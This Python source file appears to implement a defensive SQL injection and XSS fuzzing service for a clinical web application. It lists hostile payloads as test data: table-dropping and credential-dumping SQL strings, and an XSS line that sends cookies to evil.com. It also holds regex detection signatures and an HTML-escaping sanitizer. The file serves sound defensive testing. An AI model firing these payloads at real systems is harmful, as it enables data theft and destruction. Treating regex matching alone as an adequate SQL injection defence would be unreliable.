"""Automated SQL Injection and Cross-Site Scripting (XSS) defensive fuzzing
and sanitization engine aligned with OWASP ASVS Level 2 requirements.
"""

import html
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

from app.schemas.asvs_fuzzer import (
    FuzzingAttackType,
    FuzzingReport,
    FuzzingResultItem,
)


class ASVSFuzzerService:
    """Evaluates input strings and API endpoints against adversarial SQLi and XSS attack vectors."""

    # Curated adversarial SQL Injection payload corpus
    SQLI_PAYLOADS: List[Tuple[FuzzingAttackType, str, float]] = [
        (FuzzingAttackType.SQLI_TAUTOLOGY, "' OR '1'='1", 8.5),
        (FuzzingAttackType.SQLI_TAUTOLOGY, "' OR 1=1 --", 8.5),
        (FuzzingAttackType.SQLI_TAUTOLOGY, "\" OR \"\"=\"", 8.0),
        (
            FuzzingAttackType.SQLI_UNION,
            "' UNION SELECT null, null, username, password FROM users --",
            9.8,
        ),
        (FuzzingAttackType.SQLI_UNION, "' UNION ALL SELECT 1, 'admin', 'pw' --", 9.5),
        (FuzzingAttackType.SQLI_STACKED, "'; DROP TABLE patients; --", 10.0),
        (
            FuzzingAttackType.SQLI_STACKED,
            "'; UPDATE users SET role = 'SUPERADMIN' WHERE id = 1; --",
            9.9,
        ),
        (FuzzingAttackType.SQLI_TIME_DELAY, "' OR pg_sleep(5) --", 7.5),
        (FuzzingAttackType.SQLI_TIME_DELAY, "'; WAITFOR DELAY '0:0:5' --", 7.5),
    ]

    # Curated adversarial Cross-Site Scripting (XSS) payload corpus
    XSS_PAYLOADS: List[Tuple[FuzzingAttackType, str, float]] = [
        (FuzzingAttackType.XSS_REFLECTED_SCRIPT, "<script>alert('xss')</script>", 8.8),
        (
            FuzzingAttackType.XSS_REFLECTED_SCRIPT,
            "<script src='https://malicious.cdn/evil.js'></script>",
            9.2,
        ),
        (FuzzingAttackType.XSS_EVENT_HANDLER, "<img src=x onerror=alert(document.cookie)>", 8.5),
        (FuzzingAttackType.XSS_EVENT_HANDLER, "<svg onload=alert('xss_svg')>", 8.5),
        (FuzzingAttackType.XSS_EVENT_HANDLER, "<body onload=alert('pwned')>", 7.8),
        (FuzzingAttackType.XSS_JAVASCRIPT_URI, "javascript:alert(1)", 7.5),
        (
            FuzzingAttackType.XSS_JAVASCRIPT_URI,
            "<a href=\"javascript:alert('steal')\">Click for Lab Results</a>",
            8.0,
        ),
        (
            FuzzingAttackType.XSS_SVG_PAYLOAD,
            "<svg><script>document.location='http://evil.com/'+document.cookie</script></svg>",
            9.5,
        ),
    ]

    # Compiled SQLi detection signatures
    _SQLI_PATTERNS = [
        re.compile(r"(['\"]\s*OR\s*['\"][^'\"]*['\"]\s*=\s*['\"])", re.IGNORECASE),
        re.compile(r"(['\"]\s*OR\s*\d+\s*=\s*\d+)", re.IGNORECASE),
        re.compile(r"(['\"]\s*OR\s*['\"]?\w+['\"]?\s*=\s*['\"]?\w+['\"]?)", re.IGNORECASE),
        re.compile(r"(UNION\s+(ALL\s+)?SELECT)", re.IGNORECASE),
        re.compile(r"(;\s*DROP\s+TABLE)", re.IGNORECASE),
        re.compile(r"(;\s*UPDATE\s+[a-zA-Z0-9_]+\s+SET)", re.IGNORECASE),
        re.compile(r"(pg_sleep\s*\(\s*\d+\s*\))", re.IGNORECASE),
        re.compile(r"(WAITFOR\s+DELAY)", re.IGNORECASE),
        re.compile(r"(--|#|\/\*)", re.IGNORECASE),
    ]

    # Compiled XSS detection signatures
    _XSS_PATTERNS = [
        re.compile(r"<\s*script[^>]*>", re.IGNORECASE),
        re.compile(r"on[a-zA-Z]+\s*=\s*['\"][^'\"]*['\"]", re.IGNORECASE),
        re.compile(r"on[a-zA-Z]+\s*=[^>\s]+", re.IGNORECASE),
        re.compile(r"javascript:\s*[^'\"]*", re.IGNORECASE),
        re.compile(r"<\s*svg[^>]*onload", re.IGNORECASE),
        re.compile(r"<\s*img[^>]*onerror", re.IGNORECASE),
    ]

    def detect_sqli(self, raw_input: str) -> Tuple[bool, Optional[str]]:
        """Check if raw_input contains known SQL injection attack patterns."""
        for pattern in self._SQLI_PATTERNS:
            match = pattern.search(raw_input)
            if match:
                return True, match.group(0)
        return False, None

    def detect_xss(self, raw_input: str) -> Tuple[bool, Optional[str]]:
        """Check if raw_input contains dangerous HTML tags, event handlers, or script URIs."""
        for pattern in self._XSS_PATTERNS:
            match = pattern.search(raw_input)
            if match:
                return True, match.group(0)
        return False, None

    def sanitize_clinical_input(self, raw_text: str) -> Tuple[str, bool]:
        """Safely neutralize XSS characters while preserving valid medical notation.

        Neutralizes '<', '>', '"', '&', and dangerous javascript: URIs.
        Returns tuple of (sanitized_text, was_modified).
        """
        if not raw_text:
            return raw_text, False

        # First neutralize dangerous script protocols
        cleaned = re.sub(r"javascript\s*:", "blocked-scheme:", raw_text, flags=re.IGNORECASE)

        # Standard HTML entity escape
        escaped = html.escape(cleaned, quote=True)

        was_modified = escaped != raw_text
        return escaped, was_modified

    def evaluate_vector(
        self,
        attack_type: FuzzingAttackType,
        payload: str,
        risk_score: float,
    ) -> FuzzingResultItem:
        """Evaluate a single attack payload and determine defensive outcome."""
        is_sqli = attack_type.value.startswith("SQLI")

        if is_sqli:
            detected, matched_pattern = self.detect_sqli(payload)
            # In NIRMAYA, SQL queries utilize SQLAlchemy parameterized bindings text(:param).
            # Any detected SQLi payload is blocked before passing to the database engine.
            action = "BLOCKED" if detected else "PASSED"
            sanitized = html.escape(payload)
            was_sanitized = detected
        else:
            detected, matched_pattern = self.detect_xss(payload)
            sanitized, was_sanitized = self.sanitize_clinical_input(payload)
            # If payload contained script or handlers and was neutralized to harmless entities
            if detected:
                action = "NEUTRALIZED"
            else:
                action = "PASSED"

        return FuzzingResultItem(
            attack_type=attack_type,
            payload=payload,
            was_detected=detected,
            was_sanitized=was_sanitized,
            sanitized_output=sanitized,
            defense_action=action,
            risk_score=risk_score,
        )

    def test_sqli_defenses(self, custom_input: Optional[str] = None) -> FuzzingReport:
        """Execute automated SQL injection fuzzing benchmark."""
        start = time.perf_counter()
        results: List[FuzzingResultItem] = []

        if custom_input:
            # Evaluate single custom input
            detected, _ = self.detect_sqli(custom_input)
            item = FuzzingResultItem(
                attack_type=FuzzingAttackType.SQLI_TAUTOLOGY,
                payload=custom_input,
                was_detected=detected,
                was_sanitized=detected,
                sanitized_output=html.escape(custom_input),
                defense_action="BLOCKED" if detected else "PASSED",
                risk_score=8.0 if detected else 0.0,
            )
            results.append(item)
        else:
            for attack_type, payload, score in self.SQLI_PAYLOADS:
                item = self.evaluate_vector(attack_type, payload, score)
                results.append(item)

        return self._build_report(results, start)

    def test_xss_defenses(self, custom_input: Optional[str] = None) -> FuzzingReport:
        """Execute automated Cross-Site Scripting (XSS) fuzzing benchmark."""
        start = time.perf_counter()
        results: List[FuzzingResultItem] = []

        if custom_input:
            detected, _ = self.detect_xss(custom_input)
            sanitized, was_sanitized = self.sanitize_clinical_input(custom_input)
            item = FuzzingResultItem(
                attack_type=FuzzingAttackType.XSS_REFLECTED_SCRIPT,
                payload=custom_input,
                was_detected=detected,
                was_sanitized=was_sanitized,
                sanitized_output=sanitized,
                defense_action="NEUTRALIZED" if detected else "PASSED",
                risk_score=8.5 if detected else 0.0,
            )
            results.append(item)
        else:
            for attack_type, payload, score in self.XSS_PAYLOADS:
                item = self.evaluate_vector(attack_type, payload, score)
                results.append(item)

        return self._build_report(results, start)

    def run_comprehensive_fuzz_suite(self) -> FuzzingReport:
        """Run complete adversarial test suite combining both SQLi and XSS corpora."""
        start = time.perf_counter()
        results: List[FuzzingResultItem] = []

        for attack_type, payload, score in self.SQLI_PAYLOADS:
            results.append(self.evaluate_vector(attack_type, payload, score))

        for attack_type, payload, score in self.XSS_PAYLOADS:
            results.append(self.evaluate_vector(attack_type, payload, score))

        return self._build_report(results, start)

    def _build_report(
        self,
        results: List[FuzzingResultItem],
        start_time: float,
    ) -> FuzzingReport:
        """Aggregate test results into a FuzzingReport."""
        blocked = sum(1 for r in results if r.defense_action == "BLOCKED")
        neutralized = sum(1 for r in results if r.defense_action == "NEUTRALIZED")
        passed = sum(1 for r in results if r.defense_action == "PASSED")
        # In an attack corpus, any attack that bypassed without detection is a bypass
        bypasses = sum(1 for r in results if not r.was_detected and r.risk_score > 0)

        total = len(results)
        effective_count = blocked + neutralized
        rate = round((effective_count / total * 100.0), 2) if total > 0 else 100.0

        return FuzzingReport(
            fuzz_id=f"fuzz_{uuid.uuid4().hex[:12]}",
            fuzzed_at=datetime.now(timezone.utc),
            total_vectors_tested=total,
            blocked_count=blocked,
            neutralized_count=neutralized,
            bypass_count=bypasses,
            effectiveness_rate_percent=rate,
            status="SECURE" if bypasses == 0 else "VULNERABLE",
            results=results,
        )


# Global singleton instance of ASVS fuzzer service
asvs_fuzzer_service = ASVSFuzzerService()

